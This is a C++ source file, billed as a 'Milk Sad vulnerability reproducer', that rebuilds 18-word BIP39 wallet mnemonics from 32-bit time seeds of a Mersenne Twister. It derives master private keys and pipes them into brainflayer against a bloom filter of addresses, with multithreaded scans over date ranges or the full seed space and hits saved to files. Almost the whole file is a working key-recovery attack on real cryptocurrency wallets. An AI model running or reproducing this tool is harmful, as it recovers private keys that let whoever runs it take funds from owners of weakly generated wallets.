/**
 * Milk Sad Vulnerability Reproducer (Upgraded - 18 Words Variant)
 * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
 * checks against brainflayer via pipe.
 */

#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cmath>
#include <stdexcept>
#include <algorithm>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <cctype>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <climits>

// --- Configuration ---
const std::string WORDLIST_DIR = "./Wordlist/";
const std::string OUTPUT_FILE_PREFIX = "found_keys_";
const uint64_t REPORT_INTERVAL = 100000; // Report to stdout every N keys per thread
const int DEFAULT_NUM_THREADS = 10; // Default safe number

// --- Global Flags ---
std::atomic<bool> g_stop_flag(false);

// --- Signal Handler ---
void signal_handler(int) {
    g_stop_flag = true;
    std::cout << "\n[!] Interrupt received. Stopping threads..." << std::endl;
}

// --- Helper Functions ---

bool file_exists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::string path = WORDLIST_DIR + filename;
    
    // Fallback: check current directory if not in Wordlist/
    if (!file_exists(path) && file_exists(filename)) {
        path = filename;
    }

    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open wordlist: " + path);
    }

    std::string word;
    while (std::getline(file, word)) {
        // Trim whitespace
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) continue;
        size_t last = word.find_last_not_of(" \t\r\n");
        wordlist.push_back(word.substr(first, (last - first + 1)));
    }

    if (wordlist.size() != 2048) {
        throw std::runtime_error("Wordlist must contain exactly 2048 words. Found: " + std::to_string(wordlist.size()));
    }
    return wordlist;
}

// --- Crypto Functions ---

// SHA256 Helper
std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

// Generate BIP39 Mnemonic from a 32-bit Time Seed (Modified for 18 Words / 192-bit)
std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    // 1. Initialize Mersenne Twister with the timestamp
    std::mt19937 engine(seed_value);

    // 2. Generate 192 bits (24 bytes) of entropy
    // MODIFIED: Changed from 32 bytes (256 bits) to 24 bytes (192 bits)
    const int ENTROPY_BYTES = 24; 
    std::vector<uint8_t> entropy(ENTROPY_BYTES);
    
    for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
        uint32_t random_block = engine();
        // Copy 4 bytes safely
        std::memcpy(&entropy[i], &random_block, 4);
    }

    // 3. Calculate Checksum 
    // For 192 bits entropy, checksum is 192 / 32 = 6 bits.
    // SHA256(entropy), take first byte (we will only use top 6 bits)
    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];

    // 4. Combine Entropy + Checksum 
    // Total needed: 18 words * 11 bits = 198 bits.
    // Entropy (192 bits) + Checksum (6 bits) = 198 bits.
    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte); 

    std::string mnemonic;
    mnemonic.reserve(200); 

    // Loop for 18 words (MODIFIED from 24)
    const int NUM_WORDS = 18;
    for (int i = 0; i < NUM_WORDS; ++i) {
        int start_bit = i * 11;
        int word_index = 0;

        // Extract 11 bits starting from start_bit
        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8); // Big Endian reading

            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }

        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }

    return mnemonic;
}

// Convert Mnemonic to Root Private Key (BIP39 Seed -> BIP32 Master Key)
std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    // 1. PBKDF2: Mnemonic + Salt("mnemonic") -> 512-bit Seed
    const int iterations = 2048;
    const std::string salt = "mnemonic"; // No passphrase used in this reproduction
    std::vector<uint8_t> seed(64);
    
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) {
        return "";
    }

    // 2. HMAC-SHA512: Key("Bitcoin seed") + Data(Seed) -> Master Node (Private Key + Chain Code)
    // We only need the first 32 bytes (Private Key) for brainflayer checking
    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    
    HMAC(EVP_sha512(), 
         reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), 
         hmac_result, &hmac_len);

    // Convert first 32 bytes to Hex
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) {
        ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    }
    return ss.str();
}

// --- Time Utilities ---

uint32_t get_unix_timestamp(const std::tm& tm) {
    std::tm temp_tm = tm;
    // Set environment to UTC to ensure mktime treats input as UTC
    #ifdef _WIN32
        _putenv("TZ=UTC");
        _tzset();
    #else
        setenv("TZ", "UTC", 1);
        tzset();
    #endif
    
    time_t ts = std::mktime(&temp_tm);
    if (ts == -1) throw std::runtime_error("Invalid time format");
    return static_cast<uint32_t>(ts);
}

std::tm parse_iso_date(const std::string& s) {
    std::tm tm = {};
    std::stringstream ss(s);
    ss >> std::get_time(&tm, "%Y-%m-%d");
    if (ss.fail()) throw std::runtime_error("Parse error. Use YYYY-MM-DD");
    tm.tm_isdst = 0;
    return tm;
}

// --- Worker Thread ---

void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::mutex& print_mtx) {
    
    // Command to pipe into brainflayer
    // -i - : read from stdin
    // -t priv : input is hex private keys
    // -x : output format hex
    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > brainflayer_found_" + std::to_string(thread_id) + ".txt 2>&1";
    
    FILE* pipe = popen(cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] Error: Failed to open brainflayer pipe." << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        // Core Logic
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        // Write to brainflayer
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
             // Pipe broken
             break;
        }

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        // Progress logging
        if (local_processed % REPORT_INTERVAL == 0) {
            std::lock_guard<std::mutex> lock(print_mtx);
            std::cout << "[Thread " << thread_id << "] Current TS: " << ts 
                      << " | Processed: " << local_processed << std::endl;
        }
    }

    pclose(pipe);
    
    {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed << std::endl;
    }
}

// --- Main Menu & Logic ---

int main() {
    // 1. Prevent crash on broken pipe (if brainflayer closes early)
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    OpenSSL_add_all_algorithms();

    std::cout << "=================================================" << std::endl;
    std::cout << "   Milk Sad Vulnerability Reproducer (18 Words)  " << std::endl;
    std::cout << "=================================================" << std::endl;

    // 2. Check Prerequisites
    if (!file_exists("./brainflayer/brainflayer")) {
        std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
        return 1;
    }
    if (!file_exists("./040823BF.blf")) {
        std::cerr << "Error: Bloom filter ./040823BF.blf not found!" << std::endl;
        return 1;
    }

    // 3. Load Wordlist
    std::vector<std::string> wordlist;
    try {
        std::cout << "[*] Loading english.txt..." << std::endl;
        wordlist = load_wordlist("english.txt");
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        std::cerr << "Make sure 'english.txt' is in ./Wordlist/ or current directory." << std::endl;
        return 1;
    }

    // 4. User Input
    int choice;
    std::cout << "\nSelect Mode:\n";
    std::cout << "1. Single Timestamp Check\n";
    std::cout << "2. Date Range Scan (Multithreaded)\n";
    std::cout << "3. Full 32-bit Scan (Warning: Long duration)\n";
    std::cout << "> ";
    std::cin >> choice;

    uint32_t start_ts = 0, end_ts = 0;

    if (choice == 1) {
        std::string date_str, time_str;
        std::cout << "Enter Date (YYYY-MM-DD): ";
        std::cin >> date_str;
        std::cout << "Enter Time (HH:MM:SS): ";
        std::cin >> time_str;

        std::tm tm = parse_iso_date(date_str);
        sscanf(time_str.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
        
        uint32_t ts = get_unix_timestamp(tm);
        std::cout << "\nChecking Timestamp: " << ts << std::endl;
        
        std::string m = generate_mnemonic_bip39(ts, wordlist);
        std::string k = mnemonic_to_root_key_hex(m);
        std::cout << "Mnemonic (18 words): " << m << std::endl;
        std::cout << "Root Key: " << k << std::endl;
        
        // Single check cmd
        std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
        system(cmd.c_str());
        return 0;

    } else if (choice == 2) {
        std::string start_str, end_str;
        std::cout << "Start Date (YYYY-MM-DD): ";
        std::cin >> start_str;
        std::cout << "End Date   (YYYY-MM-DD): ";
        std::cin >> end_str;

        std::tm tm_start = parse_iso_date(start_str);
        std::tm tm_end = parse_iso_date(end_str);
        
        // Set start to 00:00:00
        tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
        // Set end to 23:59:59
        tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;

        start_ts = get_unix_timestamp(tm_start);
        end_ts = get_unix_timestamp(tm_end);

    } else if (choice == 3) {
        start_ts = 0;
        end_ts = UINT_MAX;
    } else {
        std::cout << "Invalid choice." << std::endl;
        return 1;
    }

    int num_threads = DEFAULT_NUM_THREADS;
    std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
    if (std::cin.peek() != '\n') std::cin >> num_threads;
    
    if (num_threads < 1) num_threads = 1;

    std::cout << "\n[*] Starting Scan..." << std::endl;
    std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
    std::cout << "Total keys: " << (uint64_t)end_ts - start_ts << std::endl;

    // 5. Thread Distribution
    std::vector<std::thread> threads;
    std::atomic<uint64_t> total_counter(0);
    std::mutex print_mutex;

    uint64_t total_range = (uint64_t)end_ts - start_ts + 1;
    uint64_t chunk_size = total_range / num_threads;

    for (int i = 0; i < num_threads; ++i) {
        uint32_t t_start = start_ts + (i * chunk_size);
        uint32_t t_end = (i == num_threads - 1) ? end_ts : t_start + chunk_size - 1;

        threads.emplace_back(worker_thread, t_start, t_end, i, 
                             std::cref(wordlist), 
                             std::ref(total_counter), 
                             std::ref(print_mutex));
    }

    // Wait for threads
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n[!] Scan Complete." << std::endl;
    std::cout << "Check 'brainflayer_found_*.txt' files for any hits." << std::endl;

    return 0;
}
